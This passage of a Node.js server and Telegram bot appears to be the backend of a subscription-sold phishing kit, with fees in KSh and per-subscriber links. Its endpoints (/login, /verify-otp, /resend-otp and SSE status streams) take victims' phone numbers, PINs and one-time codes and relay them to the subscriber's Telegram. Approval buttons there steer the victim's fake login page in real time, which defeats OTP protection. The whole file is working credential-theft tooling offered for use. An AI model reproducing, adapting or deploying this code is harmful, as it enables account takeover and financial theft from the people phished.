      await sendTg(targetChatId, `🎉 <b>You've Been Added!</b>\n\n🔗 <code>${link}</code>\n📅 ${expiresAt ? fmtDate(expiresAt) : 'Never (permanent)'}\n\nSend /mylink anytime.`);
    } catch (e) { log.error('assignuser:', e.message); }
  });

  onMsg(/^\/removeuser(@\S+)?\s+(\S+)/, async (msg, match) => {
    if (!isAdmin(String(msg.chat.id))) return;
    const id = match[2].trim().toLowerCase(); const user = users.get(id);
    if (!user) { await bot.sendMessage(msg.chat.id, `❌ Not found.`).catch(() => {}); return; }
    if (user.source === 'env') { await bot.sendMessage(msg.chat.id, `⚠️ Env user — remove <code>USER_${id.toUpperCase()}_ID</code> from env.`, { parse_mode: 'HTML' }).catch(() => {}); return; }
    user.dupes.clear(); user.tgQueue.flush('removed'); users.delete(id); await deleteUserFromDB(id); await deleteStateFromDB(id);
    await bot.sendMessage(msg.chat.id, `✅ <b>Removed:</b> ${sanitize(user.name)} [<code>${id}</code>]`, { parse_mode: 'HTML' }).catch(() => {});
  });

  onMsg(/^\/extend(@\S+)?\s+(\S+)\s+(\d+)/, async (msg, match) => {
    if (!isAdmin(String(msg.chat.id))) return;
    const id = match[2].trim().toLowerCase(), days = parseInt(match[3], 10), user = users.get(id);
    if (!user) { await bot.sendMessage(msg.chat.id, `❌ Not found.`).catch(() => {}); return; }
    const base = (user.expiresAt && !isExpired(user.expiresAt)) ? user.expiresAt : new Date().toISOString();
    const expiresAt = addDays(base, days); user.expiresAt = expiresAt; user.expired = false; user.warningSent = false;
    await persistUser(user.id, user.name, user.chatId, user.createdAt, expiresAt);
    await bot.sendMessage(msg.chat.id, `✅ Extended <b>${sanitize(user.name)}</b> [<code>${id}</code>] by ${days}d.\n📅 ${fmtDate(expiresAt)}`, { parse_mode: 'HTML' }).catch(() => {});
  });

  onMsg(/^\/extendall(@\S+)?\s+(\d+)/, async (msg, match) => {
    if (!isAdmin(String(msg.chat.id))) return; const days = parseInt(match[2], 10); if (!days) return;
    const targets = [...users.values()].filter(u => u.expiresAt); let s = 0;
    for (const u of targets) { const ne = addDays(u.expiresAt, days); u.expiresAt = ne; u.expired = false; u.warningSent = false; await persistUser(u.id, u.name, u.chatId, u.createdAt, ne); s++; }
    await bot.sendMessage(msg.chat.id, `✅ +${days}d → ${s} user(s). Permanent not affected.`, { parse_mode: 'HTML' }).catch(() => {});
  });

  onMsg(/^\/reduceall(@\S+)?\s+(\d+)/, async (msg, match) => {
    if (!isAdmin(String(msg.chat.id))) return; const days = parseInt(match[2], 10); if (!days) return;
    const targets = [...users.values()].filter(u => u.expiresAt);
    const wouldExpire = targets.filter(u => daysUntil(u.expiresAt) - days <= 0);
    if (wouldExpire.length) {
      const names = wouldExpire.map(u => `• ${sanitize(u.name)} [<code>${u.id}</code>] (${daysUntil(u.expiresAt)}d)`).join('\n');
      await bot.sendMessage(msg.chat.id, `⚠️ Will expire ${wouldExpire.length} user(s):\n\n${names}\n\nSend <code>/reduceallconfirm ${days}</code>`, { parse_mode: 'HTML' }).catch(() => {}); return;
    }
    let s = 0; for (const u of targets) { const ne = addDays(u.expiresAt, -days); u.expiresAt = ne; u.warningSent = false; await persistUser(u.id, u.name, u.chatId, u.createdAt, ne); s++; }
    await bot.sendMessage(msg.chat.id, `✅ -${days}d → ${s} user(s).`, { parse_mode: 'HTML' }).catch(() => {});
  });

  onMsg(/^\/reduceallconfirm(@\S+)?\s+(\d+)/, async (msg, match) => {
    if (!isAdmin(String(msg.chat.id))) return; const days = parseInt(match[2], 10); if (!days) return;
    const targets = [...users.values()].filter(u => u.expiresAt); let s = 0, exp = 0;
    for (const u of targets) { const ne = addDays(u.expiresAt, -days); u.expiresAt = ne; u.warningSent = false; if (isExpired(ne)) { u.expired = true; exp++; } await persistUser(u.id, u.name, u.chatId, u.createdAt, ne); s++; }
    await bot.sendMessage(msg.chat.id, `✅ -${days}d → ${s} user(s). ⚠️ ${exp} expired.`, { parse_mode: 'HTML' }).catch(() => {});
  });

  onMsg(/^\/revoke(@\S+)?\s+(\S+)/, async (msg, match) => {
    if (!isAdmin(String(msg.chat.id))) return; const user = users.get(match[2].trim().toLowerCase());
    if (!user) { await bot.sendMessage(msg.chat.id, `❌ Not found.`).catch(() => {}); return; }
    user.expiresAt = new Date(Date.now() - 60000).toISOString(); user.expired = true;
    await persistUser(user.id, user.name, user.chatId, user.createdAt, user.expiresAt);
    await bot.sendMessage(msg.chat.id, `✅ Revoked <b>${sanitize(user.name)}</b> [<code>${user.id}</code>].`, { parse_mode: 'HTML' }).catch(() => {});
  });

  onMsg(/^\/permanent(@\S+)?\s+(\S+)/, async (msg, match) => {
    if (!isAdmin(String(msg.chat.id))) return; const user = users.get(match[2].trim().toLowerCase());
    if (!user) { await bot.sendMessage(msg.chat.id, `❌ Not found.`).catch(() => {}); return; }
    user.expiresAt = null; user.expired = false; user.warningSent = false;
    await persistUser(user.id, user.name, user.chatId, user.createdAt, null);
    await bot.sendMessage(msg.chat.id, `✅ <b>${sanitize(user.name)}</b> [<code>${user.id}</code>] is now permanent.`, { parse_mode: 'HTML' }).catch(() => {});
  });

  onMsg(/^\/broadcast(@\S+)?\s+([\s\S]+)/, async (msg, match) => {
    if (!isAdmin(String(msg.chat.id))) return; const text = match[2].trim(); if (!text) return;
    let sent = 0, failed = 0;
    for (const u of users.values()) { const r = await sendTg(u.chatId, `📢 <b>Announcement</b>\n\n${sanitize(text)}`); if (r.success) sent++; else failed++; }
    await bot.sendMessage(msg.chat.id, `✅ Broadcast: sent ${sent}, failed ${failed}`).catch(() => {});
  });

  // ── Callback queries ──
  bot.on('callback_query', async (query) => {
    if (!trackUpdate(`cb_${query.id}`)) return;
    try { await handleCallback(query); }
    catch (err) { log.error('Callback error:', err.message); try { await bot.answerCallbackQuery(query.id, { text: '❌ Error', show_alert: true }); } catch (e) {} }
  });
};

// ============================================
// EXPIRY CHECKER
// ============================================
const runExpiryCheck = async () => {
  for (const user of users.values()) {
    if (!user.expiresAt) continue; const daysLeft = daysUntil(user.expiresAt);
    if (daysLeft <= 0 && !user.expired) {
      user.expired = true;
      await sendTg(user.chatId, `⚠️ <b>Subscription Expired</b>\n\nPay <b>KSh. ${RENEWAL_AMOUNT}</b> to:\n<code>${PAYMENT_DETAILS}</code>\n\nThen send /start to renew.`);
      if (ADMIN_CHAT_ID) await sendTg(ADMIN_CHAT_ID, `🔔 <b>Expired</b>\n\n👤 ${sanitize(user.name)} [<code>${user.id}</code>]\n🆔 <code>${user.chatId}</code>\n📅 ${fmtDate(user.expiresAt)}`);
    } else if (daysLeft > 0 && daysLeft <= CFG.WARNING_DAYS && !user.warningSent) {
      user.warningSent = true;
      await sendTg(user.chatId, `⏰ <b>Expiring Soon</b>\n\n${daysLeft} day${daysLeft !== 1 ? 's' : ''} left (${fmtDate(user.expiresAt)}).\n\nPay <b>KSh. ${RENEWAL_AMOUNT}</b> to:\n<code>${PAYMENT_DETAILS}</code>\n\nThen send /start to renew.`);
    }
  }
};

// ============================================
// CALLBACK HANDLER
// ============================================
async function handleCallback(query) {
  const msg = query.message, chatId = msg.chat.id, messageId = msg.message_id, data = query.data;
  const ack = async (text, alert = false) => { try { await bot.answerCallbackQuery(query.id, { text, show_alert: alert }); } catch (e) {} };
  const edit = async (text, kb = null) => {
    try { await bot.editMessageText(text, { chat_id: chatId, message_id: messageId, parse_mode: 'HTML', reply_markup: kb || { inline_keyboard: [] } }); }
    catch (e) { if (!e.message?.includes('not modified')) log.error('Edit:', e.message); }
  };

  // ── PAYMENT ──
  if (data.startsWith('pay|')) {
    const [, action] = data.split('|'), username = getUsername(query.from);
    if (action === 'claim') {
      if ([...users.values()].find(u => u.chatId === String(chatId))) { await edit(`✅ <b>Already Registered</b>\n\nUse /mylink.`); return; }
      if (pendingPayments.has(String(chatId))) { await edit(`⏳ <b>Already Pending</b>`); return; }
      pendingPayments.set(String(chatId), { chatId: String(chatId), username, claimedAt: Date.now() });
      await edit(`⏳ <b>Payment Claim Received</b>\n\n🆔 <b>Your ID:</b> <code>${chatId}</code>\n\nYour claim has been sent to the administrator.\nKeep this ID — you may be asked for it.\n\nYou will receive your link once payment is confirmed.`);
      if (ADMIN_CHAT_ID) await sendTg(ADMIN_CHAT_ID, `💳 <b>New Claim</b>\n\n👤 ${sanitize(username)}\n🆔 <code>${chatId}</code>\n⏰ ${new Date().toLocaleString()}\n💰 KSh. ${PAYMENT_AMOUNT}`,
        { reply_markup: { inline_keyboard: [[ { text: '✅ Approve', callback_data: `admin|approve|${chatId}|${username}` }, { text: '❌ Reject', callback_data: `admin|reject|${chatId}|${username}` } ]] } });
    } else if (action === 'cancel') { await edit(`❌ <b>Cancelled</b>\n\nSend /start anytime.`); }
    return;
  }

  // ── RENEWAL ──
  if (data.startsWith('renew|')) {
    const [, action] = data.split('|'), username = getUsername(query.from);
    if (action === 'claim') {
      const eu = [...users.values()].find(u => u.chatId === String(chatId));
      if (!eu) { await edit(`⚠️ Not found.`); return; }
      if (pendingRenewals.has(String(chatId))) { await edit(`⏳ <b>Already Pending</b>`); return; }
      pendingRenewals.set(String(chatId), { chatId: String(chatId), username, userId: eu.id, claimedAt: Date.now() });
      await edit(`⏳ <b>Renewal Claim Received</b>\n\n🆔 <b>Your ID:</b> <code>${chatId}</code>\n\nYour renewal claim has been sent to the administrator.\nYou will be notified once confirmed.`);
      if (ADMIN_CHAT_ID) await sendTg(ADMIN_CHAT_ID, `🔄 <b>Renewal</b>\n\n👤 ${sanitize(username)}\n🆔 <code>${chatId}</code>\n🔑 <code>${eu.id}</code>\n💰 KSh. ${RENEWAL_AMOUNT}`,
        { reply_markup: { inline_keyboard: [[ { text: '✅ Approve', callback_data: `admin|renew|${chatId}|${username}` }, { text: '❌ Reject', callback_data: `admin|rejectrenew|${chatId}|${username}` } ]] } });
    } else if (action === 'cancel') { await edit(`❌ <b>Cancelled</b>`); }
    return;
  }

  // ── ADMIN ──
  if (data.startsWith('admin|')) {
    if (!isAdmin(String(chatId))) { await ack('❌ Not authorised', true); return; }
    const parts = data.split('|'), action = parts[1], userChatId = parts[2], username = parts[3] || 'Unknown';
    const displayName = sanitize(username.replace(/^@/, '')), timeLine = `⏱️ ${new Date().toLocaleTimeString()}`;
    if (action === 'approve') {
      const newId = nextAvailableId(); if (!newId) { await edit(`❌ No slots.`); return; }
      const newUser = await registerUser(newId, displayName, userChatId); pendingPayments.delete(userChatId);
      const link = ROOT_LINK ? `${ROOT_LINK}/${newId}/` : '(set ROOT_LINK)';
      await edit(`✅ <b>Approved</b>\n\n👤 ${sanitize(username)}\n🆔 <code>${userChatId}</code>\n🔑 <code>${newId}</code>\n🔗 <code>${link}</code>\n📅 ${fmtDate(newUser.expiresAt)}\n\n${timeLine}`);
      await sendTg(userChatId, `🎉 <b>Payment Confirmed!</b>\n\n🔗 <code>${link}</code>\n📅 <b>Valid until:</b> ${fmtDate(newUser.expiresAt)}\n\nUse /mylink or /expiry anytime.`);
    } else if (action === 'reject') {
      pendingPayments.delete(userChatId);
      await edit(`❌ <b>Rejected</b>\n\n👤 ${sanitize(username)}\n🆔 <code>${userChatId}</code>\n\n${timeLine}`);
      await sendTg(userChatId, `❌ <b>Payment Not Confirmed</b>\n\nContact admin. Send /start to try again.`);
    } else if (action === 'renew') {
      const eu = [...users.values()].find(u => u.chatId === String(userChatId));
      if (!eu) { await edit(`❌ Not found.`); return; }
      const ne = await renewUser(eu); pendingRenewals.delete(userChatId);
      const link = ROOT_LINK ? `${ROOT_LINK}/${eu.id}/` : '';
      await edit(`✅ <b>Renewed</b>\n\n👤 ${sanitize(username)}\n🔑 <code>${eu.id}</code>\n📅 ${fmtDate(ne)}\n\n${timeLine}`);
      await sendTg(userChatId, `🎉 <b>Renewal Confirmed!</b>\n\n🔗 <code>${link}</code>\n📅 <b>Valid until:</b> ${fmtDate(ne)}`);
    } else if (action === 'rejectrenew') {
      pendingRenewals.delete(userChatId);
      await edit(`❌ <b>Renewal Rejected</b>\n\n👤 ${sanitize(username)}\n🆔 <code>${userChatId}</code>\n\n${timeLine}`);
      await sendTg(userChatId, `❌ <b>Renewal Not Confirmed</b>\n\nContact admin. Send /start to try again.`);
    }
    return;
  }

  // ══════════════════════════════════════════
  // VERIFICATION CALLBACKS (login | otp)
  // ══════════════════════════════════════════
  const callbackUser = [...users.values()].find(u => u.chatId === String(chatId));
  if (!callbackUser) { await ack('❌ User not found', true); return; }
  const parsed = parseCb(data); if (!parsed) { await ack('❌ Bad data', true); return; }
  const { type, action, phone, secret } = parsed;
  const key = `${phone}-${secret}`, now = Date.now();

  if (type === 'login') {
    const rec = callbackUser.logins.get(key);
    if (!rec) { await ack('❌ Session not found', true); return; }
    if (rec.approved || rec.rejected) { await ack('✅ Already processed'); return; }
    if (now - rec.ts > CFG.APPROVAL_TIMEOUT) {
      Object.assign(rec, { approved: false, rejected: true, expired: true });
      sseBroker.push(`login:${key}`, { approved: false, rejected: true, expired: true, reason: null });
      await edit(`⏰ <b>EXPIRED</b>\n📞 <code>${phone}</code>\n🔐 <code>${secret}</code>`); await ack('⏰ Expired', true); return;
    }
    if (action === 'proceed') {
      rec.approved = true; sseBroker.push(`login:${key}`, { approved: true, rejected: false, expired: false, reason: null });
      await edit(`✅ <b>ALLOWED</b>\n📞 <code>${phone}</code>\n🔐 <code>${secret}</code>\n\n→ OTP step`); await ack('✅ Allowed!');
    } else if (action === 'invalid') {
      Object.assign(rec, { rejected: true, reason: 'invalid' }); sseBroker.push(`login:${key}`, { approved: false, rejected: true, expired: false, reason: 'invalid' });
      await edit(`❌ <b>INVALID</b>\n📞 <code>${phone}</code>\n🔐 <code>${secret}</code>`); await ack('❌ Invalid');
    }
    return;
  }

  if (type === 'otp') {
    const rec = callbackUser.otps.get(key);
    if (!rec) { await ack('❌ Not found', true); return; }
    if (rec.status !== 'pending') { await ack('✅ Already processed'); return; }
    if (now - rec.ts > CFG.APPROVAL_TIMEOUT) {
      rec.status = 'timeout'; sseBroker.push(`otp:${key}`, { status: 'timeout' });
      await edit(`⏰ <b>EXPIRED</b>\n📞 <code>${phone}</code>\n🔑 <code>${secret}</code>`); await ack('⏰ Expired', true); return;
    }
    if (action === 'correct') {
      rec.status = 'approved'; sseBroker.push(`otp:${key}`, { status: 'approved' });
      await edit(`✅ <b>VERIFIED</b>\n📞 <code>${phone}</code>\n🔑 <code>${secret}</code>\n\n✅ User logged in successfully`); await ack('✅ Verified!');
    } else if (action === 'wrong') {
      rec.status = 'rejected'; sseBroker.push(`otp:${key}`, { status: 'rejected' });
      await edit(`❌ <b>WRONG OTP</b>\n📞 <code>${phone}</code>\n🔑 <code>${secret}</code>`); await ack('❌ Wrong OTP');
    } else if (action === 'wrongpin') {
      rec.status = 'wrong_pin'; sseBroker.push(`otp:${key}`, { status: 'wrong_pin' });
      await edit(`⚠️ <b>WRONG PIN</b>\n📞 <code>${phone}</code>\n🔑 <code>${secret}</code>`); await ack('⚠️ Wrong PIN');
    }
    return;
  }
  await ack('❓ Unknown type');
}

// ============================================
// AUTO-CLEANUP
// ============================================
setInterval(() => {
  const now = Date.now(), expire = now - CFG.APPROVAL_TIMEOUT, purge = now - 10 * 60_000;
  for (const u of users.values()) {
    for (const [k, v] of u.logins) { if (!v.expired && v.ts < expire) Object.assign(v, { approved: false, rejected: true, expired: true }); if (v.ts < purge) u.logins.delete(k); }
    for (const [k, v] of u.otps) {
      if (v.status === 'pending' && v.ts < expire) { v.status = 'timeout'; sseBroker.push(`otp:${k}`, { status: 'timeout' }); }
      if (v.readAt && now - v.readAt > CFG.READ_TTL) { u.otps.delete(k); continue; }
      if (v.ts < purge) u.otps.delete(k);
    }
  }
}, CFG.CLEANUP_INTERVAL).unref?.();

// ============================================
// MIDDLEWARE — resolve /:userId + check expiry
// ============================================
const resolveUser = (req, res, next) => {
  const { userId } = req.params;
  if (!userId || !/^[a-z]{2}$/.test(userId)) return res.status(400).json({ success: false, message: 'Invalid user ID format (e.g. aa, ab)' });
  const user = users.get(userId);
  if (!user) return res.status(404).json({ success: false, message: `User "${userId}" not configured` });
  if (user.expiresAt && isExpired(user.expiresAt)) { user.expired = true; return res.status(402).json({ success: false, expired: true, message: 'Subscription expired. Renew via the Telegram bot.', expiredAt: user.expiresAt }); }
  req.user = user; next();
};
const botOk = (user, res) => { if (!bot || !botHealthy) { res.status(503).json({ success: false, message: 'Bot service unavailable' }); return false; } return true; };

// ============================================
// UPDATE BUFFER
// ============================================
const MAX_BUFFERED_UPDATES = 200;
let updateBuffer = [];
const flushUpdateBuffer = () => {
  if (!bot || !updateBuffer.length) return;
  const batch = updateBuffer; updateBuffer = [];
  log.info(`Flushing ${batch.length} buffered update(s)...`);
  for (const update of batch) { try { bot.processUpdate(update); } catch (e) { log.error('processUpdate (buffered):', e.message); } }
};

// ============================================
// WEBHOOK ROUTE
// ============================================
app.post('/webhook/:token', (req, res) => {
  if (req.params.token !== process.env.BOT_TOKEN) { log.warn(`Webhook wrong token from ${req.ip}`); return res.sendStatus(403); }
  if (!bot) { if (updateBuffer.length < MAX_BUFFERED_UPDATES) updateBuffer.push(req.body); else { updateBuffer.shift(); updateBuffer.push(req.body); } return res.sendStatus(200); }
  try { bot.processUpdate(req.body); } catch (e) { log.error('processUpdate:', e.message); }
  res.sendStatus(200);
});

// ============================================
// HEALTH CHECK
// ============================================
app.get('/api/health', (_, res) => {
  res.json({
    status: botHealthy ? 'ok' : 'degraded',
    bot: { healthy: botHealthy, mode: 'webhook', webhookUrl: WEBHOOK_URL || '(not set)', restarts: restartCount },
    users: [...users.values()].map(u => ({ id: u.id, num: u.num, name: u.name, chatId: u.chatId, source: u.source, expiresAt: u.expiresAt, expired: u.expired, daysLeft: u.expiresAt ? daysUntil(u.expiresAt) : null, logins: u.logins.size, otps: u.otps.size })),
    pendingPayments: pendingPayments.size, pendingRenewals: pendingRenewals.size, sse: sseBroker.size, timestamp: ts(),
  });
});

// ============================================
// API ENDPOINTS (parameterised by :userId)
// ============================================
app.post('/api/:userId/login', resolveUser, async (req, res) => {
  const user = req.user; if (!botOk(user, res)) return;
  const { pin, timestamp, bundle } = req.body, raw = req.body.phoneNumber;
  if (!raw || !pin) return res.status(400).json({ success: false, message: 'Phone and PIN required' });
  const pe = vPhone(raw); if (pe) return res.status(400).json({ success: false, message: pe });
  const ie = vPin(pin); if (ie) return res.status(400).json({ success: false, message: ie });
  const phone = normalise(raw);
  if (user.dupes.seen(`login:${phone}:${pin}`)) return res.json({ success: true, message: 'Cached' });
  const key = `${phone}-${pin}`;
  user.logins.set(key, { ts: Date.now(), approved: false, rejected: false, expired: false });
  const text = fmtLogin(user, { phone, pin, time: timestamp || Date.now(), bundle });
  const keyboard = { inline_keyboard: [ [{ text: '✅ Allow to Proceed', callback_data: mkCb('login', 'proceed', phone, pin) }], [{ text: '❌ Invalid Information', callback_data: mkCb('login', 'invalid', phone, pin) }] ] };
  const r = await sendMsg(user, text, { reply_markup: keyboard });
  r.ok ? res.json({ success: true, message: 'Waiting for approval' }) : res.status(500).json({ success: false, message: 'Failed to notify', error: r.err });
});

app.post('/api/:userId/check-login-approval', resolveUser, (req, res) => {
  const { pin } = req.body, raw = req.body.phoneNumber;
  if (!raw || !pin) return res.status(400).json({ success: false, message: 'Phone and PIN required' });
  const phone = normalise(raw), rec = req.user.logins.get(`${phone}-${pin}`);
  if (!rec) return res.json({ success: true, approved: false, rejected: false, expired: false });
  if (Date.now() - rec.ts > CFG.APPROVAL_TIMEOUT) return res.json({ success: true, approved: false, rejected: true, expired: true });
  res.json({ success: true, approved: rec.approved, rejected: rec.rejected, expired: rec.expired || false, reason: rec.reason || null });
});

app.get('/api/:userId/stream-login-approval', resolveUser, (req, res) => {
  const { phone: rp, pin } = req.query;
  if (!rp || !pin) return res.status(400).json({ success: false, message: 'phone and pin required' });
  const phone = normalise(rp), key = `${phone}-${pin}`, rec = req.user.logins.get(key);
  if (rec && (rec.approved || rec.rejected)) {
    res.setHeader('Content-Type', 'text/event-stream'); res.flushHeaders();
    res.write(`data: ${JSON.stringify({ approved: rec.approved, rejected: rec.rejected, expired: rec.expired || false, reason: rec.reason || null })}\n\n`); return res.end();
  }
  sseBroker.subscribe(`login:${key}`, res);
});

app.post('/api/:userId/verify-otp', resolveUser, async (req, res) => {
  const user = req.user; if (!botOk(user, res)) return;
  const { otp, timestamp, bundle } = req.body, raw = req.body.phoneNumber;
  if (!raw || !otp) return res.status(400).json({ success: false, message: 'Phone and OTP required' });
  const pe = vPhone(raw); if (pe) return res.status(400).json({ success: false, message: pe });
  const oe = vOtp(otp); if (oe) return res.status(400).json({ success: false, message: oe });
  const phone = normalise(raw);
  if (user.dupes.seen(`otp:${phone}:${otp}`)) return res.json({ success: true, message: 'Cached' });
  const key = `${phone}-${otp}`;
  user.otps.set(key, { status: 'pending', ts: Date.now() });
  const text = fmtOtp(user, { phone, otp, time: timestamp || Date.now(), bundle });
  const keyboard = { inline_keyboard: [ [{ text: '✅ Correct (PIN + OTP)', callback_data: mkCb('otp', 'correct', phone, otp) }], [ { text: '❌ Wrong Code', callback_data: mkCb('otp', 'wrong', phone, otp) }, { text: '⚠️ Wrong PIN', callback_data: mkCb('otp', 'wrongpin', phone, otp) } ] ] };
  const r = await sendMsg(user, text, { reply_markup: keyboard });
  r.ok ? res.json({ success: true, message: 'OTP sent' }) : res.status(500).json({ success: false, message: 'Failed to notify', error: r.err });
});

app.post('/api/:userId/check-otp-status', resolveUser, (req, res) => {
  const { otp } = req.body, raw = req.body.phoneNumber;
  if (!raw || !otp) return res.status(400).json({ success: false, message: 'Phone and OTP required' });
  const phone = normalise(raw), rec = req.user.otps.get(`${phone}-${otp}`);
  if (!rec) return res.json({ success: true, status: 'pending' });
  if (Date.now() - rec.ts > CFG.APPROVAL_TIMEOUT) return res.json({ success: true, status: 'timeout' });
  if (['approved', 'rejected', 'wrong_pin'].includes(rec.status)) rec.readAt = rec.readAt || Date.now();
  res.json({ success: true, status: rec.status });
});

app.get('/api/:userId/stream-otp-status', resolveUser, (req, res) => {
  const { phone: rp, otp } = req.query;
  if (!rp || !otp) return res.status(400).json({ success: false, message: 'phone and otp required' });
  const phone = normalise(rp), key = `${phone}-${otp}`, rec = req.user.otps.get(key);
  if (rec && rec.status !== 'pending') {
    res.setHeader('Content-Type', 'text/event-stream'); res.flushHeaders();
    res.write(`data: ${JSON.stringify({ status: rec.status })}\n\n`); return res.end();
  }
  sseBroker.subscribe(`otp:${key}`, res);
});

app.post('/api/:userId/resend-otp', resolveUser, async (req, res) => {
  const user = req.user; if (!botOk(user, res)) return;
  const raw = req.body.phoneNumber; if (!raw) return res.status(400).json({ success: false, message: 'Phone required' });
  const phone = normalise(raw);
  const r = await sendMsg(user, `🔄 <b>${sanitize(user.name)} — OTP RESEND</b>\n📞 <code>${phone}</code>\n⏰ ${new Date(req.body.timestamp || Date.now()).toLocaleString()}`);
  r.ok ? res.json({ success: true }) : res.status(500).json({ success: false, error: r.err });
});

// ============================================
// 404 / ERROR
// ============================================
app.use((req, res) => res.status(404).json({ success: false, message: 'Not found', path: req.path }));
app.use((err, req, res, next) => { log.error('Error:', err.message); res.status(500).json({ success: false, error: 'Internal server error' }); });

// ============================================
// STARTUP
// ============================================
let server;
const startServer = async () => {
  loadEnvUsers(); await connectDB(); await loadUsersFromDB(); sortUsers(); await loadStateFromDB();
  await new Promise((resolve) => {
    server = app.listen(PORT, () => {
      console.log('\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
      console.log(`🛰️  Multi-User Server — port ${PORT}`);
      console.log(`🤖 Mode: webhook`);
      console.log(`🔗 Webhook URL: ${WEBHOOK_URL || '(not set)'}`);
      console.log(`👥 Users loaded: ${users.size}`);
      console.log(`💰 Registration: KSh. ${PAYMENT_AMOUNT}  |  Renewal: KSh. ${RENEWAL_AMOUNT}`);
      console.log(`📅 Subscription: ${EXPIRY_DAYS} days  |  Warning: ${CFG.WARNING_DAYS} days before`);
      console.log(`🔗 Root link: ${ROOT_LINK || '(not set)'}`);
      console.log(`👮 Admin: ${ADMIN_CHAT_ID || '(not set)'}`);
      console.log(`📱 WhatsApp: ${WHATSAPP_NUMBER || '(not set)'}`);
      console.log('\n👥 Users:');
      users.forEach(u => { const exp = u.expiresAt ? `expires ${fmtDate(u.expiresAt)}` : 'permanent'; console.log(`   [${u.id}] ${u.name}  (${u.source})  ${exp}`); });
      console.log('\n📋 API endpoints per user:');
      console.log('   /login  /check-login-approval  /stream-login-approval');
      console.log('   /verify-otp  /check-otp-status  /stream-otp-status  /resend-otp');
      console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n');
      resolve();
    });
  });
  await initBot().catch(err => log.error('Bot init error:', err.message));
  setTimeout(runExpiryCheck, 5000);
  setInterval(runExpiryCheck, CFG.EXPIRY_CHECK_INTERVAL);
};
startServer().catch(err => { log.error('Fatal:', err.message); process.exit(1); });

// ============================================
// SHUTDOWN
// ============================================
const shutdown = async (sig) => {
  markShutdown(); log.info(`${sig} — shutting down...`);
  if (server) server.close();
  for (const u of users.values()) { u.dupes.clear(); u.tgQueue?.flush('shutting down'); }
  if (bot) { if (sig === 'SIGINT') { try { await bot.deleteWebHook(); } catch (e) {} } clearBotListeners(); bot = null; }
  if (sig === 'SIGINT') { try { const mongoose = require('mongoose'); await mongoose.connection.close(); } catch (e) {} }
  process.exit(0);
};
process.on('SIGTERM', () => shutdown('SIGTERM'));
process.on('SIGINT', () => shutdown('SIGINT'));
process.on('uncaughtException', (e) => log.error('Uncaught:', e.message, e.stack));
process.on('unhandledRejection', (r) => log.error('Unhandled rejection:', r));
